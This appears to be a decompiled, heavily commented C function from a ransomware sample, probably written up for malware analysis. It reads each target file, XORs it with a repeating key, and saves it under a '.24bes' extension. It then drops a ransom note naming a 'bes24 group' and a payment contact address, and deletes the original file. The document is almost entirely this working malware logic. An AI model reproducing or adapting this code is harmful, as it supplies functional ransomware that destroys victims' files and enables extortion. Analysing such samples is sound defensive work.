void encrypt_file(char *the_name_of_file_to_encrypt, char *key)
{
  byte current_byte;
  ulong current_index;
  int return_value_of_remove;
  size_t length_of_key;
  char ransomware_note_filename_string [1024];
  char encrypted_filename_string [1032];
  FILE *ransomware_note_file;
  void *memory_holding_file_contents;
  size_t file_size_in_bytes;
  FILE *file_to_encrypt;
  ulong loop_counter;
  
  // Open file 
  file_to_encrypt = fopen(the_name_of_file_to_encrypt,"rb");
  
  // Failed to open file  
  if (file_to_encrypt == NULL) {
    printf("Error opening file: %s\n",the_name_of_file_to_encrypt);
  }

  // Successfully opened file 
  else {
    // This part is used to determine file size in bytes
    // fseek -> go to last byte of file
    // ftell -> get current position, which gives file size
    fseek(file_to_encrypt,0,2);
    file_size_in_bytes = ftell(file_to_encrypt);
    
    // Go to first byte of file 
    rewind(file_to_encrypt);

    // Here we allocate memory to hold entire file
    memory_holding_file_contents = malloc(file_size_in_bytes);

    // Read the file into the memory that we allocated
    fread(memory_holding_file_contents,1,file_size_in_bytes,file_to_encrypt);

    // Close the original file, we will work with memory that we allocated
    fclose(file_to_encrypt);

    // Loop while index is less than file size
    // loop_counter -> starts at 0
    // current_index -> set to the iteration number of loop
    for (loop_counter = 0; current_index = loop_counter, (long)loop_counter < (long)file_size_in_bytes; loop_counter = loop_counter + 1) {
      // Read byte number loop_counter from the buffer memory_holding_file_contents
      current_byte = memory_holding_file_contents[loop_counter];
      length_of_key = strlen(key);
      // Takes 1 byte from file, XOR with one byte from the key, and writes the result into file buffer
      // The modulo operator is just used to iterate over key, and then wrap around back to beginning
      memory_holding_file_contents[loop_counter] = current_byte ^ key[current_index % length_of_key];
    }

    // This builds a new filename with 1024 bytes + padding
    // The file will be named <original-file>.24bes
    snprintf(encrypted_filename_string,0x400,"%s.24bes",the_name_of_file_to_encrypt);
    
    // Open new encrypted file    
    file_to_encrypt = fopen(encrypted_filename_string,"wb");
    // Write out encrypted file contents to encrypted file and close
    fwrite(memory_holding_file_contents,1,file_size_in_bytes,file_to_encrypt);
    fclose(file_to_encrypt);

    // Free the memory that was holding file contents 
    free(memory_holding_file_contents);
    
    // This builds a new filename with 1024 bytes + padding
    // The file will be the ransomware note
    snprintf(ransomware_note_filename_string,0x400,"%s_note.txt",encrypted_filename_string);

    // Open ransomware note 
    ransomware_note_file = fopen(ransomware_note_filename_string,"w");
    
    // Checks to see if we could successfully open / create file
    if (ransomware_note_file == NULL) {
      printf("Error creating note file: %s\n",ransomware_note_filename_string);
    }
    else {
      fwrite("This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com  to discuss payment for us providing you the decryption software..\n",1,0x99,ransomware_note_file);
      fclose(ransomware_note_file);
    }
 
    // Delete the original file after it has been encrypted!
    return_value_of_remove = remove(the_name_of_file_to_encrypt);

    // Check if delete was successful
    if (return_value_of_remove != 0) {
      printf("Error deleting original file: %s\n",the_name_of_file_to_encrypt); 
    }
  }
  return;
} 

